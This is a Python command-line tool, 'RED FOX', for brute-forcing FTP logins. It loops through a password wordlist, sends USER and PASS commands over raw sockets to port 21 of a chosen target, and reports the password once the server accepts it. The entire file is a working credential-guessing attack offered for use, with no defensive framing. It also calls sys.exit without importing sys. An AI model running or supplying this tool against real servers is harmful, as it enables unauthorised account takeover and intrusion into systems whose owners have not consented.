from colorama import Fore, Style
import socket
import re
from datetime import datetime, timedelta
import argparse

# Banner
banner = """
 
   _,-='"-.__               /\\_/\\
   `-.}       `=._,.-==-._.,  @ @._,
      `-.__   _,-.   )       _,.-'
           `"     G..m-"^m`m' 

          RED FOX - FTP BRUTE FORCE
           Created by: @foxzinnx"""

print(Style.BRIGHT + Fore.RED + banner)
print(Fore.WHITE)

# Argument parser setup
parser = argparse.ArgumentParser(description=f"{Fore.RED}RED FOX - FTP Brute Force{Style.RESET_ALL}")
parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
parser.add_argument("-u", "--user", required=True, help="Username to brute force")
parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")

args = parser.parse_args()
target = args.target
user = args.user
wordlist_path = args.wordlist

# Wordlist file handling
try:
    with open(wordlist_path, 'r') as wordlist:
        passwords = wordlist.readlines()
except FileNotFoundError:
    print(f"File {wordlist_path} not found.")
    sys.exit(1)

print(f"{Style.BRIGHT}{Fore.CYAN}[+] Starting Brute Force on FTP with user {Fore.LIGHTMAGENTA_EX}{user}{Style.RESET_ALL}")

start_time = datetime.now()
last_printed_progress = ""

# Brute force attempt loop
for idx, password in enumerate(passwords, start=1):
    password = password.strip()
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.connect((target, 21))
        tcp.recv(1024)

        tcp.sendall(f"USER {user}\r\n".encode('utf-8'))
        tcp.recv(1024)
        tcp.sendall(f"PASS {password}\r\n".encode('utf-8'))
        response = tcp.recv(1024).decode('utf-8')
        tcp.sendall("QUIT\r\n".encode('utf-8'))
        tcp.close()

        elapsed_time = datetime.now() - start_time

        if idx < len(passwords):
            remaining_time = timedelta(seconds=((len(passwords) - idx) * elapsed_time.total_seconds() / idx))
        else:
            remaining_time = timedelta(seconds=0)

        elapsed_time_formatted = str(elapsed_time).split(".")[0]
        remaining_time_formatted = str(remaining_time).split(".")[0]

        progress_message = (
            f"\r{Style.BRIGHT}{Fore.YELLOW}Attempts: {idx}/{len(passwords)} | Elapsed Time: {elapsed_time_formatted} | Estimated Remaining Time: {remaining_time_formatted}"
        )

        if progress_message != last_printed_progress:
            print(progress_message, end="", flush=True)
            last_printed_progress = progress_message

        if re.search('230', response):
            print(f"\n{Style.BRIGHT}{Fore.GREEN}[+] PASSWORD FOUND:  Username: {user} | {Fore.YELLOW}Password: {password}{Style.RESET_ALL}")
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] Brute force completed.{Style.RESET_ALL}")
            break
    except socket.error:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Connection to {target} failed.{Style.RESET_ALL}")
        break

else:
    print(f"\n{Style.BRIGHT}{Fore.RED}[-] Password not found. Try with another wordlist.{Style.RESET_ALL}")
